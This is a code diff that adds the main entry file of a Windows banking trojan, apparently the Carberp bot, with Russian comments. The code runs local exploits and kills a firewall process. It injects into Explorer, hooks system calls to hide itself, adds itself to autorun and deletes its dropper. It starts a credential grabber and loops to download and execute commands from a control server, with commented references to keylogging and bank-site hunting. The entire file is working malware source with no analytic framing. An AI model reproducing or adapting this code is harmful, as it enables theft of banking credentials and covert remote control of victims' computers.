@@ -1,0 +1,304 @@
+#include <windows.h>
+
+#include "GetApi.h"
+#include "Memory.h"
+#include "Strings.h"
+#include "DllLoader.h"
+
+#include "Utils.h"
+#include "Exploit.h"
+#include "BotUtils.h"
+#include "Rootkit.h"
+#include "Inject.h"
+#include "Unhook.h"
+#include "Loader.h"
+#include "Grabber.h"
+#include "Config.h"
+#include "Crypt.h"
+#include "FtpSniffer.h"
+#include "AvBlock.h"
+#include "ntdll.h"
+#include "BotDebug.h"
+#include "BotEvents.h"
+#include "Task.h"
+#include "md5.h"
+
+#include "Modules.h"
+
+
+#pragma comment(linker, "/ENTRY:MyMain" )
+
+
+WCHAR TempFileName[ MAX_PATH ]; //темп файл для добавления в автозагрузку
+WCHAR FileToDelete[ MAX_PATH ]; //путь для удаления первоначального файла бота
+
+DWORD dwKillPid		 = 0; //пид для убийства процесса бота
+DWORD dwFirst	     = 0; //запуск в первый раз
+DWORD dwAlreadyRun   = 0; //если уже запущены
+DWORD dwGrabberRun	 = 0; //отработал ли граббер
+DWORD dwExplorerSelf = 0; //если инжект был в собственный эксплорер
+//DWORD dwExplorerPid  = 0; //пид эксплорера
+
+//получаем пид эксплорера
+
+void DeleteDropper() // убиваем процесс, стираем файл
+{
+	if ( dwKillPid != 0 && m_wcslen( FileToDelete ) > 0 )
+	{
+		pWinStationTerminateProcess( NULL, dwKillPid , DBG_TERMINATE_PROCESS );	
+		pSetFileAttributesW( FileToDelete, FILE_ATTRIBUTE_ARCHIVE );
+		pDeleteFileW( FileToDelete );
+	}
+}
+
+
+bool SendInfo()
+{
+	bool Ret = SendFirstInfo();
+	return Ret;
+}
+
+DWORD WINAPI LoaderRoutine( LPVOID lpData )
+{
+	
+	
+
+	UnhookDlls();
+	ProtectBot();
+
+	
+	
+	// Вызываем событие
+	bool Cancel = false;
+	SVChostStart(NULL, Cancel);
+	if (Cancel)
+	{
+		// Убиваем процесс svchost
+		pExitProcess(1);
+		return 0; // для компилятора
+	}
+
+	bool FirstSended = false;
+	
+
+	PTaskManager Tasks = NULL;
+	if (InitializeTaskManager(&Tasks))
+	{
+		RegisterAllCommands(Tasks, COMMAND_ALL);
+		PCHAR URL;
+		while (true)
+		{
+			URL = GetBotScriptURL(ScriptTask);
+
+			// Загружаем и выполняем команду
+
+			DownloadAndExecuteCommand(Tasks, URL);
+			STR::Free(URL);
+
+			// "Гениальность" проектирования взаимосвязи бота и его сервера
+			// отправка стартовой информации должна идти только после получения
+			// команды
+			if (!FirstSended)
+				FirstSended = SendInfo();
+			
+			//Модуль плагинов(дроперов длл , запуск и контроль их)
+			#ifdef imbiciliH
+			URL = GetBotScriptURL(ScriptPlugins);
+			ReportToPlugin(URL);
+            StrFree(URL);
+			#endif
+			
+//Кейлогер  отпрвляет данные кейлогера и получает все имена процессов и пишет их в файл
+
+
+
+			// Приостанавливаем выполнение команд
+			if (!TaskManagerSleep(Tasks))
+				break;
+		}
+
+    }
+
+	// Если завершился процесс обработки команд то
+	// убиваем процесс
+	pExitProcess(1);
+
+	return 0;
+}
+
+
+void ExplorerMain()
+{
+	if ( !dwExplorerSelf )
+		UnhookDlls();
+
+	if ( m_wcslen( TempFileName ) > 0 )
+	{
+		#ifndef DEBUGBOT
+			AddToAutoRun( TempFileName );
+		#endif
+	}
+
+	DeleteDropper();
+
+	HookZwResumeThread();
+	HookZwQueryDirectoryFile();
+	
+	if ( !dwAlreadyRun )
+		MegaJump( LoaderRoutine );
+
+	if ( dwFirst && !dwGrabberRun )
+		MegaJump( GrabberThread );
+
+
+	//MegaJump(AvFuckThread);
+
+
+	// Вызываем событие мтарта експлорера
+
+	if (dwFirst)
+		ExplorerFirstStart(NULL);
+
+	ExplorerStart(NULL);
+
+}
+
+DWORD WINAPI ExplorerRoutine( LPVOID lpData )
+{
+	UnhookDlls();
+
+	if ( dwExplorerSelf ) //если инжект был в свой эксплорер завершаемся
+	{
+		dwExplorerSelf = 0;
+
+		if ( !InjectIntoExplorer( ExplorerRoutine ) )
+		{
+			ExplorerMain();
+		}
+
+		pExitProcess( 1 );
+	}
+
+	ExplorerMain();
+	
+	return 0;
+}
+
+DWORD LiteCrypt( int Key, LPBYTE lpResult, DWORD dwSize )
+{
+    DWORD a = 0, b = 0;
+    a = 0;
+	
+    while ( a < dwSize )
+    {
+        lpResult[ a ] ^= Key; 
+        a++; 
+    }
+
+	return a;
+}
+
+int APIENTRY MyMain() 
+{
+//Hunting();
+//IsKeyLoggerProcess();	
+	//SetScreensThread( "C:\\Documents and Settings\\Nicolay_\\Application Data\\KYL\\1.jpg" );
+//	ReadOpenDirectory(0x001a,L"KYL\\", L"*.dats");
+//	DataGrabber::SendDataFile("C:\\Documents and Settings\\Nicolay_\\Application Data\\Dat81.tmp.xsi");
+//	IsKeyLoggerProcess();
+//	 SendLoadedFiles();
+	//IsKeyLoggerProcess();
+//	Hunting();
+	//SendLoadedFiles();
+	//ReadOpenDirectory(0x001a,L"KYL\\", L"*.dat");
+	//Hunting();
+//	SendLoadedFiles();
+//	IsKeyLoggerProcess();
+//	Hunting();
+/*	IsBankHunter( "https://www.business.hsbc.co.uk/1/2/" );
+Hunting()	;
+/*
+	RunHuntThred(NULL);*/
+ /*CompareUrl( "https://www.hsbc.co.uk/1/2/*authent", "https://www.hsbc.co.uk/1/2/5555555authent" );*/
+//	pSleep(1000*10*60*10); 
+//return 0;
+	#ifdef DEBUGBOT
+		if (!StartInDebugingMode(true))
+			return 0;
+	#endif
+
+	UnhookDlls(); //снимаем хуки
+
+	WCHAR ModulePath[ MAX_PATH ];
+
+	pGetModuleFileNameW( NULL, ModulePath, MAX_PATH );
+	DWORD dwProcessHash = GetNameHash( ModulePath );
+
+	if ( dwProcessHash == GetBotHash() ) // запуск из самого бота
+	{
+		KillOutpost();
+		DWORD dwExploits = DoExploits();
+
+		if ( !dwExploits )
+		{
+			if ( MegaJump( LoaderRoutine ) )
+			{
+				dwAlreadyRun = 1;
+			}
+		}
+
+		dwExplorerSelf = 1;
+
+		if ( !JmpToExplorer( ExplorerRoutine ) )
+		{
+			dwExplorerSelf = 0;
+
+			if ( !InjectIntoExplorer( ExplorerRoutine ) && !dwAlreadyRun )
+			{
+				MegaJump( LoaderRoutine );
+			}
+		}		
+	}
+	else
+	{
+		dwFirst = 1;
+
+		KillOutpost();
+		DWORD dwExploits = DoExploits();
+
+		if ( !dwExploits )
+		{
+			if ( MegaJump( LoaderRoutine ) )
+			{
+				dwAlreadyRun = 1;
+			}
+
+			if ( MegaJump( GrabberThread ) )
+			{
+				dwGrabberRun = 1;
+			}
+		}
+				
+		m_wcsncpy( FileToDelete, ModulePath, m_wcslen( ModulePath ) );
+		dwKillPid = (DWORD)pGetCurrentProcessId();
+		CopyFileToTemp( ModulePath, TempFileName );	
+
+		dwExplorerSelf = 1;
+
+		if ( !JmpToExplorer( ExplorerRoutine ) )
+		{
+			dwExplorerSelf = 0;
+
+			if ( !InjectIntoExplorer( ExplorerRoutine ) )
+			{
+				#ifndef DEBUGBOT
+				AddToAutoRun( ModulePath );
+				#endif
+			}
+		}
+	}
+
+	pExitProcess( 1 );
+
+	return 0;
+}
